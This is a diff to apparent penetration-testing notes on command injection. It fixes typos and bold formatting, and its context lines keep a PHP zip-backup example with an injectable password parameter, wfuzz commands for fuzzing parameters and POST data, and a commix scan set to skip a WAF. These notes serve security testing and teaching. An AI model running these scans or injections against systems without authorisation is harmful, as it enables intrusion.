@@ -2,7 +2,7 @@
 
 ## Identify Parameters
 ### Command Injection
-Hijacking a system command that takes a web parameter as part of the command.
+**Hijacking a system command that takes a web parameter as part of the command.**
 
   1. Look for a parameter that **does** something with the OS/System. ie; a ping command, a backup/zip command, etc.  
 
@@ -24,10 +24,10 @@ if (isset($_POST['backup']) && !empty($_POST['password'])) {
             1 => ["file", $logFile, "w"], // stdout
             2 => ["file", $logFile, "w"], // stderr
         ];
-# In this example, we can terminate the zip command and execute code using the "Password Parameter"
+# In this example, we can terminate the zip command and execute code using the "Password" Parameter
 ```
 
-Using wfuzz to test for parameter existence
+**Using wfuzz to test for parameter existence**
 ```bash
 wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
 ```
@@ -37,7 +37,7 @@ wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parame
 ```bash
 commix --url="<URL>?<parameter>=" --level=3 --force-ssl --skip-waf --random-agent --cookie="<cookie>"
 ```
-**Command Injectionw with POST data**
+**Command Injection with POST data**
 ```bash
 wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
 ```
